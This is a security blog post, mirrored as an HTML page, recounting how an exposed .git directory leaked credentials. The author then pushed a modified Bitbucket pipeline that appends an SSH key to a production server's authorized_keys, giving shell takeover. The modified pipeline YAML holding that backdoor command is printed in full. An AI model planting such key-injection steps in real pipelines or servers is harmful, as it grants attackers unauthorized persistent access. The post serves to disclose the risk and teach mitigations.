<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://blog.razzsecurity.com/2024/09/08/exploitation-research/exploiting-ci-cd-pipelines-for-fun-and-profit/">Original</a>
    <h1>Exploiting CI / CD Pipelines for fun and profit</h1>
    
    <div id="readability-page-1" class="page"><div>
<h2>Introduction</h2>



<p>In today’s world of fast-paced development and continuous integration, security vulnerabilities can be easy to overlook. Recently, I discovered a severe exploit chain, starting from a publicly exposed <code>.git</code> directory, which led to a full server takeover. This blog will walk through the chain of events, outlining how each weak point compounded the issue.</p>



<h2>Public Exposure of .git Directory</h2>



<p>A surprising number of websites still expose their <code>.git</code> directories to the public. When scanning for such exposures on a target, I noticed that the <code>.git</code> folder was publicly accessible. This is a serious vulnerability because <code>.git</code> stores the entire version history of a project, including configuration files, which might contain sensitive information.</p>



<figure><img fetchpriority="high" decoding="async" width="731" height="169" src="https://blog.razzsecurity.com/wp-content/uploads/2024/09/image-2.png" alt="" srcset="https://blog.razzsecurity.com/wp-content/uploads/2024/09/image-2.png 731w, https://blog.razzsecurity.com/wp-content/uploads/2024/09/image-2-300x69.png 300w" sizes="(max-width: 731px) 100vw, 731px"/><figcaption>.git contains sensitive information, and should never be exposed publicly</figcaption></figure>



<p><strong>Impact</strong>: With access to <code>.git/config</code>, I found credentials, which opened the door to further exploitation. I could just clone the entire repository using the URL found inside the config file.</p>



<h2>Exploring the Repository and Discovery of Bitbucket Pipelines</h2>



<p>After cloning the repository using the found credentials, I began exploring the repository’s contents. In the process, I discovered that the code owners used Bitbucket Pipelines for deployment.</p>



<p>Bitbucket Pipelines allows you to automatically run code whenever someone interacts (pushes code, raises an issue, opens a PR and so on) with your repository. In this instance, the pipeline was set to log in to the production server, <code>cd</code> into the folder holding the source code, and run a <code>git pull</code>, which would update the running application’s source code. Here’s how a sample pipeline would look like:</p>



<pre><code>pipelines:
  branches:
    master:
      - step:
          name: Update deployment
          script:
            - pipe: atlassian/ssh-run:0.2.8
              variables:
                SSH_USER: &#39;ubuntu&#39;
                MODE: &#39;command&#39;
                SERVER: &#39;damn.vulnerable.site&#39;
                COMMAND: &#39;cd /path/to/app &amp;&amp; git pull&#39;</code></pre>



<p><strong>Key Findings</strong>: The pipeline configuration file revealed that SSH was being used to log into the production server as part of the automated deployment process.</p>



<h2>Pushing Malicious Changes to the Pipeline</h2>



<p>I modified the pipeline configuration to add my SSH key onto the production server’s <code>authorized_keys</code> file. By changing the pipeline configuration, I ensured that the next time the pipeline ran, my key would be added to the authorized SSH keys allowed to log in to the server. Here’s how my modified pipeline file looked like:</p>



<pre><code>pipelines:
  branches:
    master:
      - step:
          name: Pushed to Master
          script:
            - pipe: atlassian/ssh-run:0.2.8
              variables:
                SSH_USER: &#39;ubuntu&#39;
                MODE: &#39;command&#39;
                SERVER: &#39;damn.vulnerable.site&#39;
                COMMAND: &#39;mkdir -p /home/ubuntu/.ssh &amp;&amp; echo ssh-rsa AAAA...snip...sw== &gt;&gt; /home/ubuntu/.ssh/authorized_keys &amp;&amp; chmod 700 /home/ubuntu/.ssh &amp;&amp; chmod 600 /home/ubuntu/.ssh/authorized_keys &amp;&amp; cd /path/to/app &amp;&amp; git pull&#39;</code></pre>



<h2>SSH Access and Server Takeover</h2>



<p>After committing my changes and pushing them back to the repository, I just had to wait for the pipeline to be run. After a few minutes, I attempted logging in to the server, and it gladly granted me shell access. From here, the server was effectively compromised, and I had full control over it.</p>



<figure><img decoding="async" width="1024" height="522" src="https://blog.razzsecurity.com/wp-content/uploads/2024/09/ssh-login-1024x522.png" alt="" srcset="https://blog.razzsecurity.com/wp-content/uploads/2024/09/ssh-login-1024x522.png 1024w, https://blog.razzsecurity.com/wp-content/uploads/2024/09/ssh-login-300x153.png 300w, https://blog.razzsecurity.com/wp-content/uploads/2024/09/ssh-login-768x392.png 768w, https://blog.razzsecurity.com/wp-content/uploads/2024/09/ssh-login.png 1319w" sizes="(max-width: 1024px) 100vw, 1024px"/></figure>



<p><strong>Final Step</strong>: I logged into the server, confirmed the SSH access worked, and had the ability to execute any command.</p>



<p>For those with a keen eye, there’s also an immediate <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">privilege escalation vulnerability </a>which can be executed to gain root access.</p>



<h2>Mitigation Strategies</h2>



<p><strong>Monitor your SSH keys</strong>. Regularly review who has access to your production servers and remove any unnecessary or outdated keys.</p>



<p><strong>Never expose your <code>.git</code> directory publicly</strong>. Use server configurations to block access to this directory.</p>



<h2>Conclusion</h2>



<p>This exploit chain highlights the risks associated with public exposure of sensitive directories and improper handling of CI/CD pipelines. It serves as a reminder to developers and sysadmins to audit their code repositories, deployment pipelines and server configuration regularly to prevent such attacks.</p>
<div itemtype="http://schema.org/Person" itemscope="" itemprop="author"><div><p><img alt="Mukesh" src="https://secure.gravatar.com/avatar/ca4aa6f98cb0c13339585a8ef90070e9?s=100&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/ca4aa6f98cb0c13339585a8ef90070e9?s=200&amp;d=mm&amp;r=g 2x" height="100" width="100" itemprop="image"/></p><div><p>CTO of Razz Security. I’m passionate about uncovering vulnerabilities and sharing my research with the community. Through this blog, I aim to share my findings, solutions, and insights to help professionals and enthusiasts alike protect their systems and stay ahead of evolving threats.</p></div></div></div></div></div>
  </body>
</html>
